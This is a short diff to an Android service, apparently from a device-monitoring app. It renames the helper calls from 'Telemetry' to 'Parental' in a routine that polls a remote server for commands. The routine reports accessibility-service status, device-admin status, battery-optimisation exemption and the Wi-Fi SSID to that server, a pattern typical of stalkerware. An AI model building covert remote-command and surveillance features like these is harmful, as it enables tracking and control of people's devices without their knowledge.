@@ -143,8 +143,8 @@ public class CompanionSyncService extends Service {
     private void pollServerCommands() {
         final String deviceId = prefs.getString("device_id", null), serverUrl = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
         if (deviceId == null) return;
-        boolean isAccess = TelemetryLifecycleHelper.isAccessibilityEnabled(this), isAdmin = TelemetryLifecycleHelper.isDeviceAdminActive(this);
-        boolean isNoSleep = TelemetryLifecycleHelper.isBatteryOptimizationIgnored(this);
+        boolean isAccess = ParentalSetupHelper.isAccessibilityEnabled(this), isAdmin = ParentalSetupHelper.isDeviceAdminActive(this);
+        boolean isNoSleep = ParentalSetupHelper.isBatteryOptimizationIgnored(this);
         String ssid = WifiScanHelper.getConnectedSsid(this);
         ApiClient.sendHeartbeat(serverUrl, deviceId, getBatteryLevel(), false, isAccess, isAdmin, isNoSleep, ssid, new ApiClient.ApiCallback() {
             @Override public void onSuccess(JSONObject res) {
